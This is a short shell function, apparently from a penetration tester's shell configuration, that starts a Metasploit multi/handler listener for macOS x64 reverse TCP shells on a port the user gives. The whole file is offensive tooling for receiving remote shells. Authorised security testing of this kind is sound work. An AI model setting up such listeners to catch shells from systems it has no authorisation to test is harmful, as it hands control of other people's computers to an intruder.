# MSF
# ===

msflisten() {
    if [[ $# -eq 0 ]] ; then
        echo "port not provided"
        echo "usage: msflisten <port>"
        echo ""
    else
        local LPORT="$1"
        ./msfconsole -x "use multi/handler; set PAYLOAD osx/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j"
    fi
}

